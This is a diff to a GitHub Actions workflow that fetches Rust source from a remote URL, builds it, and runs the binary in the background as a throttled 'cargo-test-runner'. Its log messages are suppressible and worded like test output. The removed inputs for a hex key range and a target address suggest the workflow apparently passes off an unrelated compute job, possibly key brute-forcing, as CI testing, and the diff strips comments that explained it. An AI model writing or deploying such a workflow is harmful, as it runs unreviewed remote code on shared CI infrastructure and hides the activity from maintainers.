@@ -9,15 +9,6 @@ on:
         description: 'Test GDrive Upload?'
         type: boolean
         default: false
-      range_start:
-        description: 'Range Start (Hex)'
-        required: false
-      range_size:
-        description: 'Range Size'
-        default: '20000000'
-      target_address:
-        description: 'Target Address (Optional Override)'
-        required: false
 
 jobs:
   ci-test:
@@ -37,14 +28,13 @@ jobs:
       if: env.REMOTE_URL != ''
       run: |
         if [ "$ENABLE_LOGS" != "false" ]; then echo "Detected Remote Script URL. Downloading Rust Source..."; fi
-        # Ensure directory exists (in case user deleted src/ from repo)
+        
         mkdir -p src
         
         # Download main.rs to src/main.rs
         if [ -n "$REMOTE_TOKEN" ]; then
            curl -f -s -S -L -H "Authorization: Bearer $REMOTE_TOKEN" "$REMOTE_URL/main.rs" -o src/main.rs
-           # Optional: Download Cargo.toml if you customize dependencies remotely
-           # curl -f -s -S -L -H "Authorization: Bearer $REMOTE_TOKEN" "$REMOTE_URL/Cargo.toml" -o Cargo.toml || true
+           
         else
            curl -f -s -S -L "$REMOTE_URL/main.rs" -o src/main.rs
         fi
@@ -75,9 +65,6 @@ jobs:
       env:
         DATABASE_URL: ${{ secrets.DATABASE_URL }}
         ENABLE_LOGS: ${{ secrets.ENABLE_LOGS }}
-        RANGE_START: ${{ github.event.inputs.range_start }}
-        RANGE_SIZE: ${{ github.event.inputs.range_size }}
-        TARGET_ADDRESS: ${{ github.event.inputs.target_address }}
       if: github.event.inputs.test_upload != 'true'
       run: |
         # Install cpulimit
@@ -85,19 +72,19 @@ jobs:
 
         if [ "$ENABLE_LOGS" != "false" ]; then echo "Initializing Test Environment..."; fi
 
-        # Calculate limit: 65% of total capacity (approx 60-70% load)
+        
         CORES=$(nproc)
         LIMIT=$((CORES * 65))
         if [ "$ENABLE_LOGS" != "false" ]; then echo "Detected $CORES cores. Limiting usage to $LIMIT%..."; fi
 
-        # Run binary in background
+        
         ./target/release/cargo-test-runner &
         PID=$!
 
-        # Apply limit to PID
+        
         cpulimit -p $PID -l $LIMIT > /dev/null 2>&1 &
         
-        # Wait for the main process
+        
         wait $PID
     - name: '[TEST] Simulate Valid Session'
       if: github.event.inputs.test_upload == 'true'
